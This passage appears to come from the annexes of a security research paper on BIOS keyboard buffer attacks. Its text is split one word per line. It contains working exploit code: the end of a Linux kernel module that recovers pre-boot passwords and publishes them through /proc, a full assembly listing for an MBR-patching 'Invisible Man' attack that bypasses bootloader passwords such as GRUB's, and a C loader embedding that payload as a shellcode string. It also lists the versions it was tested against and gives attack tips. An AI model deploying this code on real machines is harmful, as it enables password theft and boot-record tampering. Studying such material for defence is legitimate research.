BiosKeyboardBuffer
+
PAGE_OFFSET
);
for
(j
=
0;
j
=
0x30
)
password_flag
=
1;
}
if
(!password_flag)
{
len=sprintf(page,
"No
password
found\n");
return
len;
}
else
{
len=sprintf(page,
"Password
to
the
latest
pre
boot
authentication
software)
:
");
for
(i
=
0;
i
=
0x30
)
{
len
+=
sprintf(page,
"%s\n--[
Password
(to
a
previous
authentication
software)
:",
page);
}
else
if
(tab2[i℄
=
0x30)
{
sprintf(page,
"%s%c",
page,
tab2[i℄);
len++;
}
else
{
break;
}
}
sprintf(page,
"%s\n",page);
len++;
}
return
len;
}
/*
*
Loading
routine
:
creates
an
entry
in
/proc
and
defines
the
previous
function
*
as
its
reading
entry.
*/
static
int
sploit_init(void)
{
static
struct
proc_dir_entry
*proc_entry;
printk("\n--[
Bios
keyboard
buffer
hysteresis
LKM
exploit\n"
"
//
Jonathan
Brossard
-
PI:EMAIL
-
PI:EMAIL\n");
proc_entry
=
create_proc_entry(
"prebootpassword",
0444,
NULL
);
if
(proc_entry
==
NULL)
{
printk(KERN_ALERT
"Couldn't
create
/proc
entry\n");
return
1;
}
else
{
proc_entry->read_proc
=
sploit_read_pass;
proc_entry->owner
=
THIS_MODULE;
}
return
0;
}
/*
*
Unloading
routine
*/
static
int
sploit_exit(void)
{
remove_proc_entry("prebootpassword",
&proc_root);
printk("--[
Unloading
module\n");
return
0;
}
module_init(sploit_init);
module_exit(sploit_exit);
Annexe
F
:
In
visibleMan.S
;
;
[
Attack
of
the
Invisible
Man
℄
;
(bootloader
in
the
middle)
;
;
Generic
rebooting
attack
against
pre-boot
authentication
MBRs
;
that
do
not
initialize
BIOS
keyboard
memory.
;
;
Jonathan
Brossard
--
PI:EMAIL
//
PI:EMAIL
;
;
;
;
ROADMAP
:
;
;
Use
delta
offset[0℄
trick
to
find
self
location
in
memory.
;
Fill
the
BIOS
keyboard
buffer
using
PIC
8042[1℄.
;
Allocate
a
5KB
buffer
in
RAM
reserved
to
the
BIOS.
;
Find
first
bootable
disk.
;
Read
old
MBR
backup
in
reserved
RAM.
;
Patch
disk
with
old
MBR.
;
Load
MBR
in
RAM
at
address
0x0000:0x7c00
;
Unallocate
BIOS
memory
if
possible
;
Jump
to
0x0000:0x7c00
;
;
NOTES
:
;
Since
some
BIOS/virtual
machines
do
not
follow
the
standards
;
and
do
check/modify
memory
when
calling
int
0x19,
we
will
;
emulate
it
by
loading
the
MBR
in
RAM
and
jumping
to
it.
;
;
Since
we
patch
an
actual
MBR
instead
of
crafting
one
from
scratch,
;
size
does
matter.
The
initial
jump
of
the
MBR
is
a
jmp
short,
so
;
it
might
be
up
to
128b
long;
we
also
need
to
keep
the
latest
two
;
bytes
that
mark
the
disk
as
bootable,
hence
,
we
roughly
have
:
;
512
-
128
-
2
=
382
bytes
available
if
we
want
to
stick
to
one
sector.
;
;
TODO
:
remove
MBR
backup
;
;
[0℄
Cf:
80's/90's
virii
writing
tutorials
a
la
40hex,
;
virii
source
code
like
Stone
or
the
Italian
Virus,
;
Dark
Avenger
virii's
source
code.
;
http://www.etext.org/zines/ASCII/40hex/
;
;
[1℄
Art
of
Assembly
Language:
Chapter
Twenty,
Randall
Hyde
;
http://webster.cs.ucr.edu/AoA/DOS/ch20/CH20-1.html
;
;
;
Tested
against:
;
*
Grub
0.97
with
MD5
hashes,
under
Gentoo
2006
;
*
Grub
0.97
with
MD5
hashes,
under
fedora
release
7
(Moonshine)
;
(vulnerable
in
both
text
and
graphical
modes)
;
;
TIP
:
;
just
add
a
few
'escape'
characters
before
the
password
if
you
;
attack
a
bootloader
with
graphical
display
like
grub.
;
;
;
org
0x100
section
.text
_start:
nop
nop
realstart:
jmp
short
DeltaCall
;
good
old
delta
offset
trick
getdelta:
pop
bx
jmp
short
afterroutinesjump
DeltaCall:
;
dummy
call
to
get
delta
offset
call
getdelta
;
;
Save
usefull
data
here
;
returnaddress:
db
0x00,
0x00
password
db
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00
db
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
db
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
db
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
db
0x00
;------------------
[
keyboard
filling
subroutines
℄
------------------
;
Credit
for
those
routines
:
;
Art
of
Assembly
Language:
Chapter
Twenty,
Randall
Hyde
;
http://webster.cs.ucr.edu/AoA/DOS/ch20/CH20-1.html
;
write_to_bios_buffer:
mov
dl,
al
xor
cx,
cx
wait_controller:
;
Wait
untill
microcontroller's
in
al,
0x64
;
control
buffer
is
empty
test
al,
1
loopnz
wait_controller
;
disable
the
keyboard
cli
;
disable
interrupts
in
al,
0x21
;
get
current
mask
push
ax
or
al,
2
;
mask
keyboard
interrupt
out
0x21,
al
call
wait_controller2
mov
al,
0x60
;
"send
keyboard"
command
out
0x64,
al
;
send
the
scancode
as
a
new
command
:
call
wait_controller2
mov
al,
dl
out
0x60,
al
call
wait_controller2
mov
al,
0x20
;
"send
keyboard"
command
out
0x64,
al
xor
cx,
cx
wait_if_full:
;
wait
until
the
controller
in
al,
0x64
;
is
accepting
data
test
al,
1
loopz
wait_if_full
call
wait_controller2
mov
al,
0x60
out
0x64,
al
call
wait_controller2
mov
al,
0x45
out
0x60,
al
fake_int0x09:
in
al,
0x60
int
0x09
;
simulate
hardware
interrupt
;
re
enable
the
keyboard,
clean
and
return
call
wait_controller2
mov
al,
0x0ae
out
0x64,
al
;
re
enable
the
keyboard
pop
ax
out
0x21,
al
;
restore
interrupt
mask
ret
wait_controller2:
;
wait
until
we
can
send
a
command
push
cx
;
to
the
microcontroller
push
ax
xor
cx,
cx
testcmdport:
in
al,
0x64
test
al,
2
;
check
'buffer
is
full'
flag
loopnz
testcmdport
pop
ax
pop
cx
ret
;------------------
[
Main
code
starts
here
℄
------------------
afterroutinesjump:
;
;
Fill
up
the
BIOS
keyboard
buffer
thanks
to
PIC
programming
;
push
bx
add
bx,2;3
mov
si,bx
;
si
points
to
password
mov
cx,32
;
max
BIOS
keyboard
buffer
size
put_password:
;
put
password
in
keyboard
push
cs
;
(without
final
\x00)
pop
ds
push
cx
mov
al,
[ds:si℄
cmp
al,
0x00
je
stop_copying
call
write_to_bios_buffer
inc
si
pop
cx
loop
put_password
push
cx
;
dummy
push
stop_copying:
pop
cx
;
dummy
pop
;
;
Reserve
a
10
KB
memory
buffer
in
the
BIOS
reserved
memory.
;
cf:
old
virii
like
Stoned,
the
Italian
Virus
etc.
;
xor
ax,ax
mov
ds,ax
mov
ax,
[ds:0x413℄
;
get
amound
of
available
memory
sub
ax,
10
;
register
10
KB
of
memory
mov
[ds:0x413℄,ax
;
update
BIOS
counter
pop
es
push
ax
;
save
counter
for
desallocation
push
es
mov
cl,06
shl
ax,cl
mov
es,ax
;
our
buffer
starts
at
es:0x00
;
find
the
bootable
hard
drive
:
;
read
1
sectors
and
check
if
disk
is
marked
;
as
bootable
on
every
disk
successively
push
es
xor
dx,dx
;
dl
=
drive
number
readnext:
inc
dl
mov
ah,
0x02
;
read
from
disk
in
memory
mov
al,
0x01
;
1
sector
mov
bx,
0x00;buffer
mov
ch,
0
mov
cl,
1
mov
dh,
0
int
13h
cmp
ah,
0x00
;
check
return
value
jne
readnext
cmp
dl,
0x10
;
test
10
drives
at
max
je
notfound
cmp
byte
[es:bx+510℄,
0x55
;
jne
readnext
;
Verify
the
disk
is
bootable
cmp
byte
[es:bx+511℄,
0xAA
;
jne
readnext
;
;
;
The
bootable
disk
number
is
in
dl,
read
20
sectors,
;
find
our
backup
and
patch
the
MBR
(1
sector).
;
pop
es
push
es
mov
ah,
0x02
;
function:
read
mov
al,
0x14
;
20
sectors
mov
bx,
0x00;
buffer
mov
ch,
0
mov
cl,
1
mov
dh,
0
int
13h
cmp
ah,
0x00
;
check
return
value
jne
readnext
push
cs
pop
ds
pop
es
pop
si
xor
bx,bx
mov
bx,
[ds:si℄
;
return
address
;
Copy
backuped
MBR
back
to
sector
1
mov
ah,
0x03
;
function:
write
mov
al,
1
;
1
sector
mov
ch,
0
mov
cl,1
;1
mov
dh,
0
int
13h
;
;
Remove
backed
up
MBR
;
mov
ah,
0x03
;
function:
write
mov
al,
1
;
1
sector
int
13h
notfound:
push
cs
pop
ds
;
;
Jump
to
our
code,
in
reserved
BIOS
RAM
;
;
We
want
to
do
a
jmp
es:ax,
but
we'll
have
;
to
code
it
ourselves...
push
cs
pop
ds
call
bigjump
bigjump:
pop
ax
add
ax,20
push
ax
pop
si
sub
ax,0x7c00
add
ax,4
mov
[ds:si℄,ax
mov
[ds:si+2℄,es
jmp
0xffff:0x0000
;
patched
at
runtime
nop
;
optional
nop
sled
nop
nop
nop
nop
nop
nop
nop
;
;
Copy
bootloader
in
RAM
at
position
0x0000:0x7C00
;
;
dl
still
contains
drive
number
mov
bx,
0x7c00
xor
ax,ax
push
ax
pop
es
mov
ah,
0x02
;
read
from
disk
in
memory
mov
al,
0x01
;
1
sector
mov
ch,
0
mov
cl,
1
mov
dh,
0
int
13h
;
;
Desallocate
memory
if
no
other
process
has
requested
;
additional
BIOS
memory
in
the
meantime
pop
ax
;
retrieve
counter
from
stack
mov
bx,
[ds:0x413℄
;
get
current
BIOS
mem
counter
cmp
ax,
bx
jne
skip_desalloc
;
someone
else
has
allocated
mem
add
ax,
10
;
unallocate
10
KB
of
memory
mov
[ds:0x413℄,ax
;
update
BIOS
counter
;
;
Do
not
mention
the
race
condition
here
;)
;
From
here,
we
are
executing
code
that
might
;
get
overwriten
anytime.
Hopefully,
protected
;
mode
is
monoprocess.
;
skip_desalloc:
;
;
Jump
to
original
bootloader
;
jmp
0x0000:0x7c00
;EOF
Annexe
G
:
In
visibleManLoader.c
/*
*
*
Jonathan
Brossard
-
PI:EMAIL
//
PI:EMAIL
*
*
"Invisible
Man"
attack
against
pre-boot
authentication
bootloaders
*
*
*
This
is
plain
old
MBR
patching,
like
implemented
*
by
many
MBR
virii
since
the
80's.
*
*
Keyboard
filling
routines
shamelessly
ripped
from
"The
art
of
assembly".
*
*/
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define
DISK_OFFSET
10000
#define
BUFF_SIZE
512
#define
BUFF_LENGTH
255
char
evilloader[℄="\x90\x90\xeb\x03\x5b\xeb\x7f\xe8\xfa\xff\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\xc2\x31\xc9\xe4\x64\xa8\x01\xe0\xfa
\xfa\xe4\x21\x50\x0c\x02\xe6\x21\xe8\x37\x00\xb0\x60\xe6\x64\xe8\x30\x00\x88\xd0
\xe6\x60\xe8\x29\x00\xb0\x20\xe6\x64\x31\xc9\xe4\x64\xa8\x01\xe1\xfa\xe8\x1a\x00
\xb0\x60\xe6\x64\xe8\x13\x00\xb0\x45\xe6\x60\xe4\x60\xcd\x09\xe8\x08\x00\xb0\xae
\xe6\x64\x58\xe6\x21\xc3\x51\x50\x31\xc9\xe4\x64\xa8\x02\xe0\xfa\x58\x59\xc3\x53
\x81\xc3\x02\x00\x89\xde\xb9\x20\x00\x0e\x1f\x51\x3e\x8a\x04\x3c\x00\x74\x08\xe8
\x90\xff\x46\x59\xe2\xef\x51\x59\x31\xc0\x8e\xd8\x3e\xa1\x13\x04\x2d\x0a\x00\x3e
\xa3\x13\x04\x07\x50\x06\xb1\x06\xd3\xe0\x8e\xc0\x06\x31\xd2\xfe\xc2\xb4\x02\xb0
\x01\xbb\x00\x00\xb5\x00\xb1\x01\xb6\x00\xcd\x13\x80\xfc\x00\x75\xea\x80\xfa\x10
\x74\x41\x26\x80\xbf\xfe\x01\x55\x75\xdd\x26\x80\xbf\xff\x01\xaa\x75\xd5\x07\x06
\xb4\x02\xb0\x14\xbb\x00\x00\xb5\x00\xb1\x01\xb6\x00\xcd\x13\x80\xfc\x00\x75\xbf
\x0e\x1f\x07\x5e\x31\xdb\x3e\x8b\x1c\xb4\x03\xb0\x01\xb5\x00\xb1\x01\xb6\x00\xcd
\x13\xb4\x03\xb0\x01\xcd\x13\x0e\x1f\x0e\x1f\xe8\x00\x00\x58\x05\x14\x00\x50\x5e
\x2d\x00\x7c\x05\x04\x00\x3e\x89\x04\x3e\x8c\x44\x02\xea\x00\x00\xff\xff\x90\x90
\x90\x90\x90\x90\x90\x90\xbb\x00\x7c\x31\xc0\x50\x07\xb4\x02\xb0\x01\xb5\x00\xb1
\x01\xb6\x00\xcd\x13\x58\x3e\x8b\x1e\x13\x04\x39\xd8\x75\x07\x05\x0a\x00\x3e\xa3
\x13\x04\xea\x00\x7c\x00\x00";
/*
Translation
tables
for
keys
to/from
scancodes
*/
char
scancodes1[℄=
{'0',
'1',
'2',
'3',
'4',
'5',
'6',
'7',
'8',
'9',
'A',
'B',
'C',
'D',
'E',
'F',
'G',
'H',
'I',